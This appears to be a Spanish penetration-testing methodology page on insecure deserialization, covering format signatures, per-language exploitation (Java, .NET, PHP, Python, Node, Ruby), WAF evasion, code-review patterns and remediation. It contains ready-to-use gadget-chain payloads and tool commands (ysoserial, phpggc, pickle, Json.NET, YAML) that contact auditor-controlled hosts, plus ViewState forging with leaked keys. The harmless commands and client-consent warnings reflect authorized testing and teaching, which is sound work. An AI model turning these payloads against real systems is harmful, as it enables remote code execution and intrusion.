# Deserialización insegura (Insecure Deserialization)

| Clasificación | |
|---|---|
| CWE | CWE-502 — Deserialization of Untrusted Data (también CWE-915 si solo se manipulan atributos, y CWE-470 en polimorfismo por nombre de clase) |
| OWASP Top 10:2025 | A08 — Software or Data Integrity Failures |
| OWASP API Top 10:2023 | Sin categoría propia (API8:2023 Security Misconfiguration cuando nace de configuración del serializador) |
| WSTG | Sin sección dedicada en WSTG 4.2; se prueba dentro de WSTG-INPV-11 (Code Injection) y WSTG-SESS (tokens/cookies serializados) |

**Contenido:** 1. Qué es · 2. Dónde buscar (firmas) · 3. Detección segura · 4. Explotación por lenguaje (Java, .NET, PHP, Python, Node, Ruby) · 5. Evasión · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

**Serializar** es convertir un objeto en memoria en bytes o texto para guardarlo o enviarlo; **deserializar** es reconstruirlo. Los formatos “nativos” (Java `ObjectInputStream`, .NET `BinaryFormatter`, PHP `serialize`, Python `pickle`, Ruby `Marshal`, YAML con etiquetas de tipo) guardan **qué clase** es cada objeto. Si el atacante controla esos bytes, elige qué clases se instancian y con qué atributos.

Al reconstruir, el lenguaje ejecuta automáticamente ciertos métodos (**métodos mágicos**: `readObject` en Java, `__wakeup`/`__destruct` en PHP, `__reduce__` en Python, `OnDeserialized` en .NET). Encadenando clases que ya existen en la aplicación o sus librerías —una **cadena de gadgets** (*gadget chain*)— se llega a ejecutar comandos, leer o escribir ficheros o hacer peticiones de red, **antes** de que la aplicación valide nada.

Además de RCE, hay impacto “lógico”: cambiar atributos de un objeto de sesión (`isAdmin=true`), confundir tipos (`password` como booleano) o provocar DoS (objetos anidados enormes).

Causa raíz: aceptar formatos que codifican tipos desde fuentes no confiables, o hacerlo sin firma/integridad y sin lista blanca de clases.

## 2. Dónde buscar (señales del reconocimiento)

Ubicaciones: cookies de sesión y “recuérdame”, campos ocultos (`__VIEWSTATE`, `javax.faces.ViewState`), cabeceras propias, cuerpos binarios, colas (Kafka, RabbitMQ, SQS, Redis/Celery), cachés (Memcached, Redis), ficheros subidos (modelos de ML `.pkl`/`.pt`/`.joblib`, `.phar`, copias de seguridad), JMX/RMI/T3/IIOP, puertos de depuración, parámetros `data=`, `state=`, `obj=`.

| Formato | Firma | Notas |
|---|---|---|
| Java `ObjectInputStream` | hex `AC ED 00 05`; Base64 `rO0AB`; gzip+Base64 `H4sIA` | cookies, ViewState de JSF, RMI/JMX (1099, 9010), T3 (WebLogic 7001) |
| Java XMLDecoder / XStream | `<java version=` / `<object class=`; etiquetas con nombres de clase | paneles legacy, REST de Struts 2 |
| Jackson / Fastjson | `["com.ejemplo.Clase",{…}]`, `"@class"`, `"@type"` | polimorfismo activado |
| SnakeYAML | `!!javax.`, `!!java.` | configuraciones subidas |
| .NET `BinaryFormatter`/`LosFormatter`/`ObjectStateFormatter` | Base64 `AAEAAAD/////`; ViewState `/wEP…` | `__VIEWSTATE`, Remoting, sesiones |
| Json.NET | `"$type":"Namespace.Clase, Ensamblado"` | `TypeNameHandling` distinto de `None` |
| PHP | `O:4:"User":2:{s:4:"name";…}`, `a:2:{…}`, `b:1;`; Base64 `Tzo`/`YTo` | cookies, campos ocultos, caché |
| Python pickle | protocolo 2+ empieza por `\x80`; Base64 `gASV` (p4), `gAN` (p3); texto `(dp0` (p0) | cookies, Celery, ML |
| PyYAML | `!!python/object/apply:` | |
| Ruby Marshal | `\x04\x08`; Base64 `BAh` | cookies de Rails antiguos |
| Ruby YAML/Psych | `--- !ruby/object:` | |
| Node `node-serialize` | `_$$ND_FUNC$$_` | cookies |

Pistas: errores `java.io.InvalidClassException`, `ClassNotFoundException`, `unserialize(): Error at offset`, `_pickle.UnpicklingError`, `System.Runtime.Serialization.SerializationException`, `The serialized data is invalid`, `incompatible marshal file format`.

## 3. Detección segura (primeras sondas, no destructivas)

1. **Decodificar e identificar** el formato (tabla anterior; CyberChef, `xxd`, `SerializationDumper` para Java).
2. **Romper la estructura** con un byte o una longitud incorrecta y observar si el error cambia (indica que se deserializa).
3. **Sonda sin ejecución de código, solo DNS:**

```bash
# Java: URLDNS no necesita librerías y solo resuelve un nombre
java -jar ysoserial.jar URLDNS "http://c0rvus.OAST" | base64 -w0
# Java: enumerar clases presentes (qué gadgets son viables) con GadgetProbe (Burp/CLI)
# Fastjson: resolución DNS al instanciar Inet4Address/Inet6Address
{"@type":"java.net.Inet4Address","val":"c0rvus.OAST"}
# .NET: ysoserial.net con un comando nslookup (ya es ejecución; usar solo tras confirmar la deserialización)
```

```python
# Python pickle: llamada inocua a socket.gethostbyname (solo DNS)
import pickle, base64, socket
class P:
    def __reduce__(self): return (socket.gethostbyname, ("c0rvus.OAST",))
print(base64.b64encode(pickle.dumps(P(), protocol=2)).decode())
```

```php
// PHP: cambiar un atributo inocuo y ver si se refleja (manipulación lógica, sin gadgets)
O:4:"User":2:{s:8:"username";s:6:"c0rvus";s:5:"theme";s:4:"dark";}
```

4. **Tiempo** como alternativa (Java `sleep` mediante gadget solo si el classpath lo permite; Python `time.sleep`): 3 s, repetido.

## 4. Explotación por contexto o tecnología

Usa siempre comandos inocuos (`nslookup c0rvus.OAST`, `id`). ⚠️ Descargar binarios, escribir ficheros o abrir shells **requiere confirmación explícita del cliente**.

### 4.1 Java

```bash
java -jar ysoserial.jar CommonsCollections6 'nslookup c0rvus.OAST' | base64 -w0      # CC 3.x, JDK moderno
java -jar ysoserial.jar CommonsCollections5 'nslookup c0rvus.OAST' > cc5.bin
java -jar ysoserial.jar CommonsBeanutils1 'nslookup c0rvus.OAST' > cb1.bin           # muy frecuente
java -jar ysoserial.jar Spring1 'nslookup c0rvus.OAST' > s1.bin
java -jar ysoserial.jar Groovy1 'nslookup c0rvus.OAST' > g1.bin
java -jar ysoserial.jar JRMPClient 'IP_AUDITOR:1099' > jrmp.bin                       # rebote a listener JRMP
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'nslookup c0rvus.OAST'
```

- Elige la cadena según librerías detectadas (GadgetProbe, mensajes de error, `pom.xml` filtrado). En JDK 16+ la encapsulación fuerte rompe algunas cadenas basadas en `TemplatesImpl`; prueba variantes (ysoserial-modified, cadenas de *Java Chains*).
- **JEP 290 / `ObjectInputFilter`**: listas de clases permitidas; busca cadenas cuyas clases estén todas dentro de la lista o el rebote JRMP si el filtro solo aplica a un flujo.
- **`serialVersionUID`** distinto ⇒ `InvalidClassException`: ajusta la versión de la librería con la que generas el payload.
- **JSF ViewState** (`javax.faces.ViewState` que empieza por `rO0`/`H4sI`): estado en cliente sin cifrar o con clave por defecto ⇒ deserialización directa.
- **Jackson** con `enableDefaultTyping()`/`activateDefaultTyping` sin validador o `@JsonTypeInfo(use = Id.CLASS)`:

```json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://IP_AUDITOR:1389/c0","autoCommit":true}]
```

  (Muchas clases están en la lista negra de versiones recientes; JNDI remoto está limitado en JDK ≥ 8u191 por `trustURLCodebase=false`, por lo que se usan factorías locales o deserialización vía LDAP.)
- **Fastjson** (`autoType`), **XStream** < 1.4.18 (sin lista blanca), **SnakeYAML** < 2.0 con `new Yaml()` (CVE-2022-1471):

```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://IP_AUDITOR/"]]]]
```

  (La petición a tu servidor ya prueba la instanciación; servir un JAR con código es ⚠️ ejecución remota y requiere confirmación explícita del cliente.)
- **XMLDecoder**:

```xml
<java><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="2"><void index="0"><string>nslookup</string></void><void index="1"><string>c0rvus.OAST</string></void></array><void method="start"/></object></java>
```

- **RMI/JMX/T3/IIOP** expuestos (infraestructura): `nmap -sV -p 1099,9010,7001 --script rmi-dumpregistry`; herramientas *remote-method-guesser* y *BaRMIe*.

### 4.2 .NET

```powershell
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "nslookup c0rvus.OAST" -o base64
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "nslookup c0rvus.OAST" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup c0rvus.OAST"
ysoserial.exe -g WindowsIdentity -f Json.Net -c "nslookup c0rvus.OAST"
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "nslookup c0rvus.OAST" -o base64
```

**Json.NET** con `TypeNameHandling` ≠ `None`:

```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
 "MethodName":"Start",
 "MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib","$values":["cmd","/c nslookup c0rvus.OAST"]},
 "ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
```

**ViewState de ASP.NET:** desde .NET 4.5.2 la validación MAC es obligatoria, así que el ataque real es conocer la `machineKey` (filtrada en `web.config` por LFI, publicada en repositorios o documentación — Microsoft alertó en 2025 de miles de claves públicas usadas en ataques):

```powershell
# Probar claves conocidas contra un ViewState capturado
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <VIEWSTATE> --purpose=viewstate --modifier=<__VIEWSTATEGENERATOR> --macdecode
# Generar payload con la clave encontrada
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "nslookup c0rvus.OAST" --generator=<GENERATOR> --validationalg="SHA1" --validationkey="<CLAVE>"
# Con cifrado (.NET ≥ 4.5): añadir --decryptionalg="AES" --decryptionkey="<CLAVE>" --path="/pagina.aspx" --apppath="/"
```

También: Telerik UI (`RadAsyncUpload`, CVE-2019-18935 y CVE-2017-11317), `DataContractSerializer`/`XmlSerializer` con tipo tomado de la petición, `JavaScriptSerializer` con `SimpleTypeResolver`, `NetDataContractSerializer`, `SoapFormatter`, .NET Remoting. `BinaryFormatter` se eliminó del runtime en .NET 9 (lanza excepción por defecto), pero sigue vivo en .NET Framework.

### 4.3 PHP

```bash
phpggc -l                                  # cadenas disponibles; phpggc -i Laravel/RCE9 muestra versiones afectadas
phpggc Laravel/RCE9 system 'nslookup c0rvus.OAST' -b          # -b: Base64
phpggc Monolog/RCE1 system 'id' -u                             # -u: codificación URL
phpggc Symfony/RCE4 exec 'nslookup c0rvus.OAST' -b
phpggc Guzzle/FW1 /tmp/c0rvus.txt c0rvus.txt                   # ⚠️ escritura de fichero
phpggc -p phar -pp cabecera.jpg -o c0.jpg Monolog/RCE1 system id   # PHAR políglota (PHP < 8)
```

- **Inyección de objetos sin gadgets** (lógica): cambiar tipos y atributos.

```text
O:4:"User":2:{s:8:"username";s:6:"c0rvus";s:7:"isAdmin";b:1;}
O:4:"User":2:{s:8:"username";s:5:"admin";s:12:"access_token";b:1;}     ← true == "cualquier cadena" con ==
a:2:{s:8:"username";s:5:"admin";s:8:"password";i:0;}                    ← 0 == "abc" en PHP < 8
```

  Ajusta las longitudes `s:N`. Propiedades privadas/protegidas usan `\0Clase\0prop` / `\0*\0prop`.
- **`phar://`** (PHP < 8.0): cualquier operación de fichero (`file_exists`, `getimagesize`, `fopen`, `is_dir`…) con una ruta controlada deserializa los metadatos del archivo PHAR. En PHP 8+ solo si se llama a `getMetadata()`.
- **Laravel con `APP_KEY` filtrada:** las cookies cifradas se deserializan (CVE-2018-15133 en versiones antiguas; en versiones actuales cualquier `decrypt()` de datos del usuario). Herramienta: *laravel-crypto-killer* (Synacktiv).
- Otras: Magento, Drupal (CVE-2019-6340, REST), WordPress (plugins con `maybe_unserialize`), Yii, CakePHP.

### 4.4 Python

```python
import pickle, base64, os
class C:
    def __reduce__(self): return (os.system, ("nslookup c0rvus.OAST",))
print(base64.b64encode(pickle.dumps(C())).decode())
```

- Sumideros: `pickle.loads`, `cPickle`, `_pickle`, `dill`, `shelve`, `jsonpickle.decode`, `joblib.load`, `numpy.load(allow_pickle=True)`, `pandas.read_pickle`, `torch.load` (desde PyTorch 2.6 `weights_only=True` por defecto), `marshal.loads`.
- **PyYAML**: `yaml.load(x)` sin `Loader` o con `Loader=yaml.Loader/UnsafeLoader`; `FullLoader` tuvo bypass (CVE-2020-1747, CVE-2020-14343).

```yaml
!!python/object/apply:os.system ["nslookup c0rvus.OAST"]
!!python/object/apply:subprocess.check_output [["id"]]
```

- **Celery** con serializador `pickle` y acceso al broker (Redis/RabbitMQ sin autenticación) ⇒ RCE en todos los workers.
- **Django** con `PickleSerializer` de sesiones (eliminado en Django 5.0) y `SECRET_KEY` filtrada ⇒ RCE. Flask usa JSON firmado: con la clave se forja la sesión, pero no hay RCE (ver `vulns/session.md`).
- **Modelos de ML** (`.pkl`, `.pt`, `.joblib`, `.h5` con capas Lambda): subir un modelo es subir código; ver `vulns/llm-ai.md`.

### 4.5 Node.js

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('nslookup c0rvus.OAST')}()"}
```

(`node-serialize`: los paréntesis finales convierten la función en una expresión que se ejecuta al deserializar.) `funcster` (`__js_function`), `cryo`, `js-yaml` 3.x con `load()` y `!!js/function` (en 4.x `load` es seguro), `serialize-javascript` usado al revés (`eval` del resultado).

### 4.6 Ruby

- `Marshal.load` con datos del usuario y Rails con `cookies_serializer = :marshal` (o `:hybrid`) + `secret_key_base` filtrada ⇒ RCE mediante cadenas universales de gadgets para Ruby/Rails (investigación pública de 2018–2022, adaptada a cada versión).
- `YAML.load` en Psych < 4 (Ruby < 3.1) instancia objetos; desde Psych 4 `YAML.load` equivale a `safe_load`. Cadena clásica con `Gem::Requirement`/`Gem::Installer`/`Net::WriteAdapter` (ver PayloadsAllTheThings; depende de la versión de RubyGems).
- `Oj.load` en modo `:object`, `ActiveSupport::MessageVerifier` con `Marshal` y clave conocida.

## 5. Evasión de filtros y WAF

- **Capas de codificación:** Base64 → URL; gzip + Base64 (Java `H4sI`); doble Base64 si el servidor lo decodifica dos veces.
- **Cambio de `Content-Type`:** `application/x-java-serialized-object`, `application/json` ↔ `application/xml` (XStream, Jackson XML).
- **Json.NET/Jackson:** escapes Unicode en claves (`"$type"`), espacios y comentarios donde el parser los acepte, nombres de ensamblado abreviados o completos.
- **PHP:** `O:+4:"User"` (signo `+` aceptado por versiones antiguas), `C:` en lugar de `O:` para clases que implementan `Serializable`, mayúsculas/minúsculas en nombres de clase (PHP no las distingue).
- **Java:** cadenas alternativas cuando una clase está en lista negra (CommonsBeanutils sin CommonsCollections, cadenas solo-JDK como URLDNS para detección), rebote JRMP, rellenar el flujo con objetos inocuos para superar firmas de tamaño.
- **YAML:** etiquetas largas (`!<tag:yaml.org,2002:python/object/apply:os.system>`) frente a filtros que buscan `!!python`.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

1. Confirmar deserialización (DNS/URLDNS) → confirmar ejecución (OAST con `whoami` en el subdominio o `id`).
2. Contexto del proceso: usuario, contenedor, red (ver `vulns/cmdi-rce.md` §6).
3. Si la vía es una **clave filtrada** (`machineKey`, `APP_KEY`, `secret_key_base`, `SECRET_KEY`), el hallazgo principal es la fuga de la clave: rotarla invalida todo lo firmado.
4. Manipulación lógica sin RCE: elevar privilegios del usuario de prueba (`isAdmin`, rol), suplantar otro usuario de prueba; documentar con dos cuentas del cliente.
5. Colas y cachés: la RCE afecta a **todos** los consumidores; no envíes payloads a colas de producción sin acordarlo (⚠️ requiere confirmación explícita del cliente).

## 7. Caja blanca: fuentes, sumideros y patrones de código

**Java / Spring**
```java
// Vulnerable
new ObjectInputStream(request.getInputStream()).readObject();
new XMLDecoder(in).readObject();  new XStream().fromXML(body);  new Yaml().load(body);   // SnakeYAML < 2.0
mapper.enableDefaultTyping();  @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
JSON.parseObject(body, Feature.SupportAutoType);                                   // Fastjson
// Seguro
ObjectInputFilter f = ObjectInputFilter.Config.createFilter("com.ejemplo.dto.*;java.base/*;!*");
ois.setObjectInputFilter(f);                       // mejor aún: no usar serialización nativa, usar JSON a DTO
mapper.activateDefaultTyping(BasicPolymorphicTypeValidator.builder().allowIfSubType("com.ejemplo.dto.").build());
new Yaml(new SafeConstructor(new LoaderOptions()));  xstream.allowTypes(new Class[]{Pedido.class});
```

**.NET**
```csharp
// Vulnerable
new BinaryFormatter().Deserialize(stream);  new LosFormatter().Deserialize(s);  new ObjectStateFormatter()
JsonConvert.DeserializeObject<object>(json, new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.Auto });
new JavaScriptSerializer(new SimpleTypeResolver());  new NetDataContractSerializer()
// Seguro
System.Text.Json.JsonSerializer.Deserialize<PedidoDto>(json);
// Json.NET si hace falta polimorfismo: TypeNameHandling.None o ISerializationBinder con lista blanca estricta
```

**PHP**
```php
// Vulnerable
$obj = unserialize($_COOKIE['data']);   unserialize(base64_decode($_POST['s']));
file_exists($_GET['path']);              // phar:// en PHP < 8
// Seguro
$data = json_decode($_COOKIE['data'], true, 16, JSON_THROW_ON_ERROR);
unserialize($s, ['allowed_classes' => false]);   // si no hay alternativa; y firmar con hash_hmac
```

**Python**
```python
# Vulnerable
pickle.loads(base64.b64decode(request.cookies["s"]));  yaml.load(body);  yaml.load(body, Loader=yaml.Loader)
jsonpickle.decode(body);  torch.load(f, weights_only=False);  numpy.load(f, allow_pickle=True)
# Seguro
json.loads(body);  yaml.safe_load(body);  torch.load(f, weights_only=True);  safetensors para modelos
```

**Node**
```js
// Vulnerable
require('node-serialize').unserialize(Buffer.from(req.cookies.profile, 'base64').toString());
yaml.load(body)            // js-yaml 3.x
// Seguro
JSON.parse(body) + validación de esquema (zod/ajv);  js-yaml 4.x load / safeLoad en 3.x
```

**Go** — `encoding/gob` y `encoding/json` decodifican en tipos concretos (riesgo bajo); vigilar `yaml.v2/v3` decodificando en `interface{}` (DoS por anclas) y RPC con `gob` expuesto.

**Ruby**
```ruby
# Vulnerable
Marshal.load(Base64.decode64(cookies[:s]));  YAML.load(params[:y])  # Psych < 4
Rails.application.config.action_dispatch.cookies_serializer = :marshal
# Seguro
JSON.parse(params[:y]);  YAML.safe_load(params[:y], permitted_classes: [Date]);  cookies_serializer = :json
```

**Búsqueda (ripgrep / semgrep)**

```bash
rg -n --pcre2 'ObjectInputStream|readObject\(|readUnshared\(|XMLDecoder|XStream\(\)|fromXML\(|enableDefaultTyping|activateDefaultTyping|JsonTypeInfo\.Id\.(CLASS|MINIMAL_CLASS)|new Yaml\(\)|SupportAutoType|parseObject\(' --type java
rg -n --pcre2 'BinaryFormatter|LosFormatter|ObjectStateFormatter|SoapFormatter|NetDataContractSerializer|TypeNameHandling\.(All|Auto|Objects|Arrays)|SimpleTypeResolver' --type cs
rg -n --pcre2 '\bunserialize\s*\(|maybe_unserialize\(|phar://' --type php
rg -n --pcre2 'pickle\.loads?\(|cPickle|dill\.loads|jsonpickle\.decode|yaml\.load\((?![^)]*SafeLoader)|joblib\.load|allow_pickle\s*=\s*True|weights_only\s*=\s*False|shelve\.open' --type py
rg -n --pcre2 'node-serialize|unserialize\(|funcster|yaml\.load\(' --type js
rg -n --pcre2 'Marshal\.load|YAML\.(unsafe_)?load\(|Oj\.load|cookies_serializer\s*=\s*:(marshal|hybrid)' --type ruby
rg -n --pcre2 'machineKey|validationKey=|APP_KEY=|secret_key_base|SECRET_KEY\s*=' -g '!*.lock'
semgrep --config p/owasp-top-ten --config p/java --config p/python .
```

## 8. Falsos positivos frecuentes

- Blobs Base64 que solo son JSON, JWT o datos cifrados con AEAD (sin acceso a la clave no son explotables; repórtalos solo si hay fuga de clave).
- URLDNS que resuelve porque el servidor **valida** URLs del contenido (por ejemplo, previsualización de enlaces) y no por deserializar: confirma con un segundo gadget o con un error de clase inexistente.
- `ClassNotFoundException` sin más: prueba que se deserializa, pero no que haya cadena viable; impacto real pendiente de gadgets.
- ViewState con MAC válido y clave no conocida: no explotable; no lo marques como crítico.
- Errores `unserialize()` que proceden de datos legítimos corruptos.

## 9. Evidencia mínima para validarlo

- Ubicación del dato serializado, formato identificado (firma decodificada) y cómo se modificó.
- Interacción DNS (URLDNS/OAST) con marca única y, si se autorizó, una ejecución inocua (`id`, `hostname`) u OAST con `whoami`.
- Cadena de gadgets usada y librerías/versiones de las que depende.
- Si la vía fue una clave filtrada: dónde se encontró (ruta, commit, respuesta) con la clave redactada.
- Para manipulación lógica: antes/después del objeto y efecto en la aplicación con cuentas de prueba.

## 10. Severidad orientativa

| Impacto | CVSS 3.1 | CVSS 4.0 (calcular con FIRST) |
|---|---|---|
| RCE sin autenticación | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8) | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` (≈9.3) |
| RCE que requiere conocer una clave filtrada por otra vía | `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` (8.1) | `AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| RCE autenticado | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (8.8) | `…/PR:L/…` (≈8.7) |
| Manipulación lógica → escalada a administrador | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` (8.1) | `…/PR:L/…/VC:H/VI:H/VA:N/…` |
| Deserialización confirmada sin cadena viable (solo DNS) | `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L` (5.6), justificar | |

## 11. Remediación

1. No deserializar formatos nativos de datos no confiables: usar JSON/Protobuf hacia **DTOs** con esquema.
2. Si es inevitable: **firmar** (HMAC) y verificar antes de deserializar, y además **lista blanca de clases** (`ObjectInputFilter`, `ISerializationBinder`, `allowed_classes`, `SafeConstructor`).
3. Desactivar polimorfismo por nombre de clase (`TypeNameHandling.None`, sin default typing en Jackson, Fastjson en modo `safeMode`).
4. Proteger y **rotar** claves de framework (`machineKey`, `APP_KEY`, `secret_key_base`, `SECRET_KEY`); nunca usar valores de ejemplo.
5. Actualizar librerías con cadenas conocidas (Commons Collections, XStream, SnakeYAML ≥ 2.0, PyYAML, Telerik); eliminar dependencias innecesarias del classpath.
6. Aislar consumidores de colas y modelos de ML; autenticación en brokers.

```java
// Java: JSON a DTO inmutable en lugar de ObjectInputStream
record PreferenciasDto(String tema, String idioma) {}
PreferenciasDto p = new ObjectMapper()
    .configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true)
    .readValue(cookieJson, PreferenciasDto.class);
```

## 12. Herramientas

- **ysoserial** (Java), **ysoserial.net** (.NET), **phpggc** (PHP), **marshalsec** (Java JNDI/LDAP/RMI), **GadgetProbe** (enumeración de clases), **SerializationDumper** (`java -jar SerializationDumper.jar <hex>`).
- **Java Deserialization Scanner** y **Freddy** (extensiones de Burp) como apoyo, nunca como primer barrido sobre producción.
- **Blacklist3r/AspDotNetWrapper** y **badsecrets** (comprobación de claves conocidas de ViewState, Flask, Django, Rails, Laravel, Telerik…).
- **laravel-crypto-killer** (Synacktiv) para cookies de Laravel con `APP_KEY` conocida.
- **remote-method-guesser**, **BaRMIe** para RMI.
- **semgrep**, **CodeQL** (`java/unsafe-deserialization`, `cs/unsafe-deserialization`, `py/unsafe-deserialization`), **fickling** (análisis de ficheros pickle).

## 13. Referencias

- OWASP Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- PortSwigger Web Security Academy — Insecure deserialization: https://portswigger.net/web-security/deserialization
- PayloadsAllTheThings — Insecure Deserialization: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
- HackTricks — Deserialization: https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html
- Frohoff & Lawrence, “Marshalling Pickles” (AppSecCali 2015); Muñoz & Mirosh, “Friday the 13th: JSON Attacks” (Black Hat 2017).
- Microsoft Security Blog (2025) — ataques de inyección de código ViewState con claves públicas.
- ysoserial: https://github.com/frohoff/ysoserial · ysoserial.net: https://github.com/pwntester/ysoserial.net · phpggc: https://github.com/ambionics/phpggc
- CWE-502: https://cwe.mitre.org/data/definitions/502.html
- Relacionados: `vulns/cmdi-rce.md`, `vulns/session.md`, `vulns/file-upload.md`, `vulns/xxe.md`, `vulns/llm-ai.md`, `vulns/config-exposure.md`.
